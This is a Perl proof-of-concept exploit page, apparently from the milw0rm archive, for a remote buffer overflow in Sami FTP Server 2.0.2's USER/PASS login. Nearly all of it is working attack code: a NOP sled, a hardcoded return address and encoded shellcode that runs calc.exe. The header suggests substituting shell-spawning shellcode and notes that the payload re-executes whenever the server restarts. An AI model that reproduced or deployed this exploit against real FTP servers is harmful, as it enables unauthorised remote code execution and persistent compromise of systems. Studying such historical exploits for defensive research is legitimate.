<html><head><title>Sami FTP Server 2.0.2 (USER/PASS) Remote Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl
#		Exploit for SAMI FTP  version 2.0.2
#		USER/PASS BUFFER OVERFLOW ARBITARY REMOTE CODE EXECUTION (CALC.exe) 
#		You can put you own shellcode to spawn a shell
#		Thrusday 17th  Jan 2007
#		Tested on : Windows 2000 SP4  (Use your own return address for other flavors)		
#		
#				
#		
#		Coded by UmZ! umz32.dll@gmail.com
#		On behalf of : Secure Bytes Inc.
#		http://www.secure-bytes.com/exploits/
#	
#
#	
#	    Special Thanks to Ahmad Tauqeer, Ali Shuja and Uquali
#
#
#	    Disclaimer: This Proof of concept exploit is for educational purpose only.
#		        Please do not use it against any system without prior permission.
#          		You are responsible for yourself for what you do with this code.
#
#
#	    Note:	After executing the exploit You will get &quot;Cannot login User or password not correct.&quot;
#			That doesn't mean exploit failed whenever you click on Sami FTP server it will crash 
#			resulting in the execution of calc.exe and will execute whenever the SAMI FTP server 
#			restarts until it is reinstalled.


use Net::FTP;


print &quot;Coded by UmZ! umz32.dll@gmail.com\n&quot;;
print &quot;http://www.secure-bytes.com/exploits/\n&quot;;
	
$ftp = Net::FTP-&gt;new(&quot;192.168.100.250&quot;, Debug =&gt; 0) or die &quot;Cannot connect : $@&quot;;

my $msg =&quot;\x90&quot; x596;      #140
my $msg2 =&quot;B&quot;x484;
my $shellcode =  &quot;\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8&quot;.
		 &quot;\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1&quot;.
		 &quot;\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07&quot;.
		 &quot;\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25&quot;.
		 &quot;\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5&quot;.
		 &quot;\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d&quot;.
		 &quot;\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4&quot;.
		 &quot;\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0&quot;.
		 &quot;\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c&quot;.
		 &quot;\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b&quot;.
		 &quot;\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4&quot;;

my $test= &quot;\x90&quot; x 108;

my $msg1=$msg. &quot;\x70\xFD\x8B\x01&quot;.&quot;\x96\x64\xF8\x77&quot;. $test .  $shellcode. &quot;\r\n&quot;;

$ftp-&gt;login($msg1.&quot;\r\n\0&quot;,&quot;umz&quot;) or die &quot;Cannot login &quot;, $ftp-&gt;message;

$ftp-&gt;quit;

# milw0rm.com [2007-01-17]</pre></html>